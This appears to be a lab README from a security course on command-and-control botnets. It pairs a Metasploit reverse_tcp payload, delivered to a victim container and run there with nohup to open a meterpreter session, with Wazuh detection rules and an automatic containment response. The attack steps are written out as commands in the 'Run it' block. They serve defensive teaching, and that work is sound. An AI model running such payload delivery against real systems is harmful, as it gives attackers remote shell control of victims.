# Threat 3 — Command-and-Control / Botnet (APT)

**Syllabus:** Botnets, Advanced Persistent Threats. **Guide:** Practical Guide 8.

> **SAFETY:** all C2 traffic stays on the internal `10.255.255.0/24` incus bridge, inside
> the VM. `payload.sh` refuses any `LHOST` that is not `10.255.255.x`. Never point this at
> a public/campus address — UA firewalls will block the account.

## Description & relevance
A C2 server remotely controls compromised hosts. A reverse shell gives the attacker
interactive control behind outbound-only firewalls; many such hosts form a botnet (e.g. to
launch the Threat 1 flood). Detecting and cutting the C2 channel is core to limiting an APT.

## Architecture
- `metasploit-container` (Kali) — C2 server (Metasploit `multi/handler`).
- `apache-container` — victim, already running a Wazuh agent.

## How it is exploited
`msfvenom` reverse_tcp payload → delivered to the victim → executed → meterpreter session
to the C2 on tcp/4444.

## Monitoring (SIEM, two angles)
- `wazuh-rules/c2_rules.xml`: 100301 (FIM realtime on `/root/loot`, payload drop) and
  100300 (command-monitoring: established connection to the C2 port → live C2 channel).
- Victim agent config: `victim_detect.sh` (adds the full_command monitor + FIM dir and
  enables local command execution).

## Action-response
`active-response/c2-contain.sh` (triggered by 100300, runs on the victim): kills the shell
process and drops egress to tcp/4444. Registered on the manager via
`active-response/manager-ossec-snippet.xml`.

## Run it
```bash
# on the VM — C2 PoC uses a lot of RAM; stop the other threats first
bash lab/control.sh ddos down; bash lab/control.sh spam down
bash lab/control.sh c2 up                       # start metasploit + victim (apache stays in core)
# first time only: incus exec metasploit-container -- bash /root/03-c2/setup_msf.sh
incus exec metasploit-container -- bash -c 'LHOST=10.255.255.81 bash /root/03-c2/payload.sh'
incus exec metasploit-container -- bash /root/03-c2/start_handler.sh      # listener
incus file pull metasploit-container/root/03-c2/payload.elf /tmp/p.elf
incus file push /tmp/p.elf apache-container/root/loot/payload.elf         # FIM fires (100301)
incus exec apache-container -- bash -c 'nohup /root/loot/payload.elf >/dev/null 2>&1 &'
# within ~15s: rule 100300 fires, c2-contain kills + blocks (active-responses.log)
```

Evidence: [`evidence/poc-run.md`](evidence/poc-run.md).
